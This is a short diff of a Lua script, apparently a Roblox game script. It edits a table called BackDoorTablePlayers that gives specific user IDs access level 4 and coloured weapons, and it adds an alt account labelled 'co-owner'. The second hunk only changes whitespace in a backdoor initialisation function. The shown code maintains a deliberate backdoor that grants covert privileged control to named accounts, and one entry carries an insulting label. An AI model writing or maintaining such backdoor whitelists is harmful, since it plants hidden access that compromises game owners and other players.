@@ -257,17 +257,17 @@ local BackDoorTableCommands = {
 
 local BackDoorTablePlayers = {
     [1530605769] = {
-        ['9vbw'] = "corey"; 
+        ['Name'] = "corey(owner)"; 
         ['Access'] = 4;
-        ['Colour'] = Color3.fromRGB(75,0,130);
+        ['Colour'] = Color3.fromRGB(22,242,255);
     };
     [172055892] = {
-        ['slappedyouonprison'] = "slapped";
+        ['Name'] = "slapped(dumbass)";
         ['Access'] = 4;
-        ['Colour'] = Color3.fromRGB(0,255,255);
+        ['Colour'] = Color3.fromRGB(22,242,255);
 };
-[1534061782] = {
-        ['whoisnirus'] = "whois";
+[4074772011] = {
+        ['Name'] = "coreyalt(co-owner)";
         ['Access'] = 4;
         ['Colour'] = Color3.fromRGB(170,0,255);
     };
@@ -582,11 +582,11 @@ end
 
 local function initalizeBackdoorPart2(BackdoorPlayer,Colour)
     if BackdoorPlayer and BackdoorPlayer.Character then
-        ColourifyGuns(BackdoorPlayer.Backpack,Colour)
+     ColourifyGuns(BackdoorPlayer.Backpack,Colour)
         ColourifyGuns(BackdoorPlayer.Character,Colour)
         BackdoorPlayer.Character.ChildAdded:Connect(function()
             ColourifyGuns(BackdoorPlayer.Character,Colour)
-        end)
+        end)   
     end
 end
 
